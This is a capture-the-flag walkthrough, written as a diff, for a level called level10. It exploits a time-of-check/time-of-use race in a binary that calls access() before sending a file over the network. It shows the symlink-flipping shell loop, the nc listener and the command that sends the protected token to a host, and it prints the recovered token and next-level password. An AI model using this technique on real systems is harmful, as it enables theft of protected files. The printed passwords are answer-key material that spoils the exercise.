@@ -1,0 +1,53 @@
+Two files in the current directory: level10 and token. We don't have access rights
+to the token file. According to level10's usage, it sends a file to a host if
+we have access to it.
+Trying to send the token shows an error message: can't access the file. So I tried
+sending a file for which I have the rights, like the program's binary itself:
+
+	./level10 ~/level10 localhost
+
+this time the program couldn't connect to "localhost:6969", which revals to me that
+the program sends the file to the 6969 port.
+
+So I open another console window and type in:
+
+	nc -lk 6969
+
+Now I'm listening on the 6969 port.
+
+That doesn't solve the first problem, I don't have access rights to the token file so I
+can't send it.
+I try taking a closer look at the level10 binary. I can't make sense of gdb's output, so I
+try:
+
+	nm -u level10
+
+nm tells me the binary uses the "access" function. It must be to check the file's permissions
+before sending it. The access function has a weak spot that is easy to exploit:
+basically there's a small time frame between the moment the program checks the access rights
+and the moment the program will actually send the file. That moment can be exploited, for example
+if the given file is a symbolic link we can make it point to another right before it is sent, and 
+the program won't know it has been fooled.
+
+First, I'll need to create the symbolic link. A small script will make it point alternatively to
+level10 (which I have the rights to) and token.
+
+	#!/bin/sh
+
+	while true; do
+        ln -fs ~/level10 /tmp/link
+        ln -fs ~/token /tmp/link
+	done
+
+Now I'll just send the file multiple times (just to be sure) to 192.168.0.36, the VM's current IP. The
+other console, that is still listening on the 6969 port, should be able to pick up the token.
+
+	./level10 /tmp/link 192.168.0.36
+
+Sure enough, after a few tries, I see it:
+
+	woupa2yuojeeaaed06riuj63c
+
+It works as a password for flag10, and I get the password for the next level:
+
+	feulo4b72j7edeahuete3no7c
